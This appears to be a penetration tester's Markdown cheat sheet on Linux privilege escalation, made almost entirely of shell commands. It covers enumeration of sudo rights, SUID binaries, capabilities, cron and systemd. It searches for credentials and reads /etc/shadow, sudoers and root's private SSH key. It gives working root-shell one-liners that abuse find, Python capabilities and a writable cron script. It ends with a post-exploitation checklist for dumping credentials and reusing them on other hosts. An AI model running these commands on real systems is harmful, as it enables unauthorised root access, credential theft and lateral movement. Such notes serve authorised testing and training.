# Linux Privilege Escalation

## Stabilize shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg; export TERM=xterm
```

## PEASS collection and parsing
```text
Use [[Shell Delivery and Transfer]].
```

## Show current user and host
```bash
id
hostname
uname -a
cat /etc/os-release
```

## Check sudo
```bash
sudo -l
sudo -l | grep LD_PRELOAD
```

## Find SUID, SGID, and capabilities
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## List cron and timers
```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
systemctl list-timers --all
```

## Show timer and service definitions
```bash
systemctl cat <timer>.timer
systemctl cat <service>.service
systemctl status <timer>.timer
systemctl status <service>.service
```

## Find writable systemd paths
```bash
find /etc/systemd /lib/systemd /usr/lib/systemd -writable 2>/dev/null
```

## Find writable directories
```bash
find / -writable -type d 2>/dev/null
```

## Show processes and listening ports
```bash
ps aux
ss -antup
ip a
ip route
```

## Watch short-lived processes with pspy
```bash
./pspy64
```

## Check bash history and keys
```bash
cat ~/.bash_history
find /home -name ".*history" 2>/dev/null
grep -rni 'PRIVATE KEY' /home 2>/dev/null
```

## Search for creds in configs
```bash
grep -rni --color=always 'password\|secret\|key\|token' /etc 2>/dev/null
grep -Horn password /var/www
find / -regextype posix-egrep -regex ".*\.(bak|zip|tar|gz)$" 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
find /opt -name "*.conf" 2>/dev/null
```

## Check sensitive files
```bash
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null
```

## Abuse SUID on common interpreters
```bash
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find . -exec /bin/sh -p \; -quit
```

## Abuse capabilities on Python
```bash
getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

## Abuse writable cron or service path
```bash
echo '/bin/bash -c "chmod u+s /bin/bash"' > /tmp/run.sh
chmod +x /tmp/run.sh
```

## Post-exploitation after root
```text
Do this before pivoting:
- dump /etc/shadow
- review all shell histories
- search /root and /home for keys and passwords
- dump app and database creds
- check extra NICs, routes, listening ports, /etc/hosts
- test found creds on SSH, databases, and other hosts
```
